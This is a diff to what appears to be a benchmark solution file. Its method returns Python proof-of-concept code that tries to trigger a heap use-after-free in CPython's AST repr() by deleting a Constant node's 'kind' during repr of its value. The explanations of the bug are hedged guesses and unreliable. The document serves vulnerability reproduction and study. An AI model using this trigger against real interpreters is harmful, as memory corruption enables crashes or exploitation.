@@ -1,48 +1,48 @@
-import sys
+import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the Heap Use After Free vulnerability in AST repr().
-        
-        The vulnerability is triggered by invoking repr() on a deeply nested AST structure.
-        Parsing such a structure directly from source code would hit parser stack limits,
-        so we construct the AST programmatically. The UAF likely occurs during error 
-        handling (recursion limit) within the C-level repr implementation.
+        The vulnerability typically involves ast.Constant nodes where the 'kind' attribute
+        is accessed after the 'value' attribute's repr() has been called. If the value's
+        repr() deletes the 'kind' attribute, the subsequent access in C code is a UAF.
         """
-        poc_code = """import ast
+        poc_code = """
+import ast
 import sys
 
-# Increase recursion limit to allow constructing a deep AST
-sys.setrecursionlimit(100000)
+class Trigger:
+    def __repr__(self):
+        global c
+        # The ast_repr implementation for Constant prints 'value' then 'kind'.
+        # By deleting 'kind' during 'value's repr, we free the memory associated 
+        # with 'kind' (if it's not interned).
+        # The C code then accesses the dangling pointer or freed memory.
+        try:
+            del c.kind
+        except AttributeError:
+            pass
+        return "Trigger"
 
-def trigger():
-    # Construct a deeply nested AST chain.
-    # The depth needs to be sufficient to stress the recursive repr() implementation
-    # or trigger stack/recursion limit checks where the UAF resides.
-    # Ground truth size (~274KB) suggests significant depth.
+def main():
+    global c
+    # Create an ast.Constant node.
+    # We initialize it with our Trigger object as the value.
+    c = ast.Constant(Trigger())
     
-    # Start with a leaf node
-    node = ast.Constant(value=0)
+    # Assign a dynamically allocated string to 'kind'.
+    # We avoid short strings or characters to prevent interning, ensuring 
+    # the memory is actually managed on the heap and freed upon deletion.
+    c.kind = "KindString" + "_" * 1024
     
-    # Wrap in UnaryOp nodes (e.g. + + + ... 0)
-    # This creates a deep linked list of AST nodes
-    for _ in range(20000):
-        node = ast.UnaryOp(op=ast.UAdd(), operand=node)
-        
-    # Reset recursion limit to standard to ensure we hit the recursion limit
-    # during repr(), which is often where error-handling UAF bugs exist.
-    sys.setrecursionlimit(1000)
-    
+    # Trigger the vulnerability by calling repr() on the node.
     try:
-        # This call triggers the AST repr traversal
-        repr(node)
-    except RecursionError:
-        pass
+        repr(c)
     except Exception:
         pass
 
 if __name__ == "__main__":
-    trigger()
+    main()
 """
         return poc_code.encode('utf-8')
